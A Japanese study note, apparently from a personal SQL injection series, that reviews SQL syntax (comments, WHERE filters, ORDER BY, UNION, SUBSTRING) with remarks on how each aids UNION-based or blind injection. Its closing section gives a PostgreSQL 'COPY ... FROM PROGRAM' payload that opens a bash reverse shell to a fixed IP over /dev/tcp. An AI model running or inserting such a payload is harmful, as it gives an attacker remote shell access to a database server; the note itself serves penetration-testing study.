# SQLコメントの種類（DBMSごと）

| コメント    | 対応DB       | 備考           |
| ------- | ---------- | ------------ |
| `--`    | 多くのDB      | 空白が必要        |
| `/* */` | 多くのDB      | 複数行コメント      |
| `#`     | **MySQL**  | 単行コメント(空白不要) |
| `REM`   | **Oracle** | 単行コメント       |

---

# MySQLクエリ文法の基礎

- SQLiを検証するにあたり、基本文法を理解することで、裏で動作しているクエリを想像できるようになる。それにより、適切なペイロードを考案できる。

## 基本文法

- SELECT文
```sql
SELECT col1, col2  FROM テーブル名 WHERE colx = value;
```

- INSERT文
```sql
INSERT INTO テーブル名 (col1, col2, ...) VALUES('value1', value2);
```

- INSERT...SELECT文
```sql
INSERT INTO テーブル名１ (col1, col2, ...) SELECT col1, col2, ... FROM `テーブル名２`
```

- UPDATE文
```sql
UPDATE テーブル名 SET col1 = value, col2 = value2 WHERE colx = value;
```
（INSERTは新規挿入、UPDATEは既存データ書換）

## WHERE句内しぼりこみ

### ANDとOR

・AND
```sql
SELECT * FROM テーブル名 WHERE colx = value AND　coly = value;
```

・OR
```sql
SELECT * FROM テーブル名 WHERE 条件 OR　条件
```

### 比較演算子

|比較演算子|意味|
|---|---|
|=|左右の値が等しい|
|<|左辺は右辺より小さい|
|>|左辺は右辺より大きい|
|<=|左辺は右辺の値以下|
|>=|左辺は右辺の値以上|
|<>|左右の値が等しくない|

### LIKE

|パターン文字|意味|
|---|---|
|%|任意の0文字以上の文字列|
|_(アンダースコア)|任意の１文字|

・カラムの値に「1月」の前後に任意の０文字以上の文字列がついているレコードの指定
```sql
SELECT * FROM テーブル名 WHERE col LIKE '%1月%'
```

### BETWEEN演算子

・ある範囲内に値が収まっているかの判定
```sql
SELECT * FROM テーブル名 WHERE 出金額 BETWEEN 1000 AND 30000
```

### 【IN/NOT IN演算子】

- 指定のカラムの値が指定の値のいずれかと合致する所を抽出する。
```sql
SELECT *
  FROM テーブル名
WHERE カラム名 IN (値1,値2,値3,・・・)
```

- 指定のカラムの値が指定の値のいずれとも合致しない所を抽出する。
```sql
SELECT * FROM テーブル名 WHERE カラム名 NOT IN (値1,値2,値3,・・・)
```

## 検索結果の加工

### 【ORDER　BY】

結果を並べ替える
（UNION based SQLiでカラム数の特定に使われる）
```sql
SELECT * FROM テーブル名 ORDER BY 1
```

### 【LIMIT】

先頭から数行だけ取得する
（LIMITのせいで抽出したいデータが取り出せない場合は、データの連結や、1つのレコードに絞るようにする：[2. SQLi UNION攻撃](2.%20SQLi%20UNION攻撃.md#1つのカラムで複数のデータを抽出する方法)）
```sql
SELECT * FROM テーブル名 ORDER BY 金額 DESC　LIMIT　３　OFFSET　２
```
OFFSETをつけると（指定の数字+1）番目のデータを取得してくれる。

### 【UNION】

・和集合：２つの検索結果を足し合わせたもの
（UNIONの左右のクエリでカラム数が一致していないといけない）
```sql
SELECT ユーザー名, 年齢, 住所　FROM　ユーザー１ UNION SELECT ユーザー名, 年齢, 住所　FROM　ユーザー2
```

## 演算子と関数

### 【CASE演算子】

・データの抽出時に使える条件分岐演算子

演算子（例）

```
SELECT ユーザー名, 
       CASE 年齢 WHEN　年齢 < 20　THEN　'未成年'
　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　WHEN　年齢　=>　20 AND　年齢　<=　65　THEN　'成年'
　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　ELSE　'高齢者'
       END AS 分類
　FROM　ユーザー
```

### 【SUBSTRING】

・文字列の一部を抽出する関数
（Blind-based SQLiで使われる）
```sql
SELECT * FROM ユーザー WHERE SUBSTRING(ユーザー名, 1, 3) LIKE '%hoge%'
```
ユーザー名列の１〜３文字目に「hoge」があるものだけを抽出

### 【CAST】

・データ型を置換する
```sql
SELECT CAST(出金額 AS VARCHAR(20)) + '円' AS 出金額（円）FROM 家計簿
```

---

# 🚨SQLiにおける文法上の注意点

###### 文字列はシングルクオテーション(`'`)で囲むこと

- ダブルクオテーションで囲むと識別子として認識されてしまう
- ❌失敗例（ダブルクオテーションで囲ってしまってる）：
```postgresql
COPY shell FROM PROGRAM "bash -c 'bash -i >& /dev/tcp/192.168.45.158/443 0>&1'";
```
- ⭕️成功例（シングルクオテーションで囲っている）：
```postgresql
COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.158/443 0>&1"';
```
